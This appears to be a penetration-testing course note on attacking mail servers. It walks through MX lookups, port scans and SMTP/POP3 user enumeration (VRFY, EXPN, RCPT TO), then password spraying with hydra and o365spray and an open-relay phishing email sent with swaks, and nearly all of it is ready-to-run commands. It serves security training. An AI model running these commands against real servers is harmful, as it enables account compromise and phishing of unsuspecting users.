A `mail server` (sometimes also referred to as an email server) is a server that handles and delivers email over a network, usually over the Internet

When we press the `Send` button in our email application (email client), the program establishes a connection to an `SMTP` server on the network or Internet. The name `SMTP` stands for Simple Mail Transfer Protocol, and it is a protocol for delivering emails from clients to servers and from servers to other servers.

When we download emails to our email application, it will connect to a `POP3` or `IMAP4` server on the Internet, which allows the user to save messages in a server mailbox and download them periodically.

By default, `POP3` clients remove downloaded messages from the email server.
## Enumeration

We can use the `Mail eXchanger` (`MX`) DNS record to identify a mail server. The MX record specifies the mail server responsible for accepting email messages on behalf of a domain name. It is possible to configure several MX records, typically pointing to an array of mail servers for load balancing and redundancy.

We can use tools such as `host` or `dig` and online websites such as [MXToolbox](https://mxtoolbox.com/) to query information about the MX records:

We can use tools such as `host` or `dig` and online websites such as [MXToolbox](https://mxtoolbox.com/) to query information about the MX records:

#### Host - MX Records

```shell-session
host -t MX hackthebox.eu
```

#### DIG - MX Records

```shell-session
dig mx plaintext.do | grep "MX" | grep -v ";"
```

#### Host - A Records

```shell-session
host -t A mail1.inlanefreight.htb.
```

Most cloud service providers use their mail server implementation and adopt modern authentication, which opens new and unique attack vectors for each service provider. On the other hand, if the company configures the service, we could uncover bad practices and misconfigurations that allow common attacks on mail server protocols.

|**Port**|**Service**|
|---|---|
|`TCP/25`|SMTP Unencrypted|
|`TCP/143`|IMAP4 Unencrypted|
|`TCP/110`|POP3 Unencrypted|
|`TCP/465`|SMTP Encrypted|
|`TCP/587`|SMTP Encrypted/[STARTTLS](https://en.wikipedia.org/wiki/Opportunistic_TLS)|
|`TCP/993`|IMAP4 Encrypted|
|`TCP/995`|POP3 Encrypted|
```shell-session
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
```

## Misconfigurations

#### Authentication

#### VRFY Command

`VRFY` this command instructs the receiving SMTP server to check the validity of a particular email username. The server will respond, indicating if the user exists or not. This feature can be disabled.

```shell-session
telnet 10.10.110.20 25
```

```shell-session
VRFY root
```

```shell-session
VRFY www-data
```

#### EXPN Command

`EXPN` is similar to `VRFY`, except that when used with a distribution list, it will list all users on that list. This can be a bigger problem than the `VRFY` command since sites often have an alias such as "all."

```shell-session
telnet 10.10.110.20 25
```

```shell-session
EXPN john
```

```shell-session
EXPN support-team
```

#### RCPT TO Command

`RCPT TO` identifies the recipient of the email message. This command can be repeated multiple times for a given message to deliver a single message to multiple recipients.

```shell-session
RCPT TO:julio
```

```shell-session
RCPT TO:kate
```

We can also use the `POP3` protocol to enumerate users depending on the service implementation. For example, we can use the command `USER` followed by the username, and if the server responds `OK`. This means that the user exists on the server.

#### USER Command

```shell-session
telnet 10.10.110.20 110
```

```shell-session
USER john
```

To automate our enumeration process, we can use a tool named [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum). We can specify the enumeration mode with the argument `-M` followed by `VRFY`, `EXPN`, or `RCPT`, and the argument `-U` with a file containing the list of users we want to enumerate. Depending on the server implementation and enumeration mode, we need to add the domain for the email address with the argument `-D`. Finally, we specify the target with the argument `-t`.

```shell-session

smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```

## Cloud Enumeration

[O365spray](https://github.com/0xZDH/o365spray) is a username enumeration and password spraying tool aimed at Microsoft Office 365 (O365) developed by [ZDH](https://twitter.com/0xzdh).

#### O365 Spray

```shell-session
python3 o365spray.py --validate --domain msplaintext.xyz
```

```shell-session
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
```

## Password Attacks

#### Hydra - Password Attack

```shell-session
 hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```

If cloud services support SMTP, POP3, or IMAP4 protocols, we may be able to attempt to perform password spray using tools like `Hydra`, but these tools are usually blocked. We can instead try to use custom tools such as [o365spray](https://github.com/0xZDH/o365spray) or [MailSniper](https://github.com/dafthack/MailSniper) for Microsoft Office 365 or [CredKing](https://github.com/ustayready/CredKing) for Gmail or Okta.


#### O365 Spray - Password Spraying

```shell-session

python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```
## Protocol Specifics Attacks

An open relay is a Simple Mail Transfer Protocol (`SMTP`) server, which is improperly configured and allows an unauthenticated email relay

#### Open Relay

```shell-session
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
```

Next, we can use any mail client to connect to the mail server and send our email.

```shell-session

swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
```







